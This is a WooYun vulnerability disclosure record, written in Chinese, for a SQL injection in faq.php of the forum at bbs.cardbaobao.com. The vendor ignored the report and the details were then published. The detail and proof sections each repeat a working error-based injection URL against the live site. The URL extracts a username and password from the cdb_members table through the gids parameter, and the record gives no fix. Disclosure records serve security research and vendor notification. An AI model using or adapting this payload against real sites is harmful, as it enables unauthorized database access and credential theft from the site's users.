wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-09-23：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-11-07：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： NULL 详细说明：  http://bbs.cardbaobao.com/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20(select%20(select%20concat(username,0x27,password)%20from%20cdb_members%20limit%201)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23

   漏洞证明：  http://bbs.cardbaobao.com/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20(select%20(select%20concat(username,0x27,password)%20from%20cdb_members%20limit%201)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23   修复方案：  NULL   版权声明：转载请注明来源 Arthur@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
